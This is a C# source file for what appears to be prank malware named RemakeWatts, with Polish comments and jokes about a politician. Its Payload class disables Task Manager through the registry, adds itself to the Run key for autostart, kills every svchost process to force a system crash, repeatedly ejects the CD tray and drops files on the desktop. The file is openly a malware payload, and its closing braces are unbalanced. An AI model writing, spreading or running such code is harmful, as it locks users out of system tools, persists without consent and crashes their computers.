using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;
using System.Diagnostics;
using System.Media;

namespace RemakeWatts
{
    public class Payload
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        public static extern int msciSendString(string ipstrCommand, string ipstrReturnString, int uReturnLenght, int hwndCallback);
        public void BlockTaskMngr()
        {
            RegistryKey blockTaskMgr = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (blockTaskMgr.GetValue("DisableTaskMgr") == null | (int)blockTaskMgr.GetValue("DisableTaskMgr") == 0)
            {
                blockTaskMgr.SetValue("DisableTaskMgr", 1);
                blockTaskMgr.Close();
            }
        }
        public void AutoStart()
        {
            RegistryKey autoStart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            autoStart.SetValue("Papointeligencja", Application.StartupPath + "\\RemakeWatts.exe");
            autoStart.Close();
        }

        public void InsertNuclearKey()//Kody nuklearne
        {
            DialogResult dialog = MessageBox.Show("Insert Nuclear Key", "Launch nuclear warhead???", MessageBoxButtons.YesNo);
            if (dialog == DialogResult.Yes)
            {
                try
                {
                    int result = msciSendString("Set cdaudio door open wait", null, 0, 0);
                    Thread.Sleep(3000);
                    result = msciSendString("Set cdaudio door closed", null, 0, 0);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            } 
            else
            {
                //Proceskrytyczny_blue_screen
                Process[] processes = Process.GetProcessesByName("svchost");
                foreach (var proc in processes)
                {
                    proc.Kill();
                }
            }
        }
        //Obrazek1
        public void payload1()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form2());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        //Obrazek2
        public void payload2()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form3());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
            }
        //Kody nuklearne
        public void payload3()
        {
            InsertNuclearKey();
        }
        //Pobieranie
        public void payload4()
        {
            /*
            new Thread(() =>
            {
                SoundPlayer player = new SoundPlayer(Properties.Resources.Paris_Platynov_zalewa_cały_sprzęt_cisowianka_Rage_roku);
                player.PlayLooping();
            }).Start();
            */
            Thread thread = new Thread(() =>
            {
                Application.Run(new Download());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        //Turbotacka
        public void payload5()
        {
            for(int i = 0; i < 10; i++)
            {
                int result = msciSendString("Set cdaudio door open wait", null, 0, 0);
                Thread.Sleep(300);
                result = msciSendString("Set cdaudio door closed", null, 0, 0);
            }
        }
        //Syfiaste pliki
        public void payload6()
        {
            //@"%userprofile%\Desktop\plik"
            string path = @"%userprofile%\Desktop\Morawiecki.txt";
            if (!File.Exists(path))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(path))
                {
                    sw.WriteLine("Kto umrze to umrze i trudno");
                    sw.WriteLine("(Morawiecki)");
                }
            }
        }
        public void payload7()
        {
            MessageBox.Show("Morawiecki zaraz zabije ci komputer");
            Thread.Sleep(128220);
            Process[] processes = Process.GetProcessesByName("svchost");
            foreach (var proc in processes)
            {
                proc.Kill();
            }
    }

}
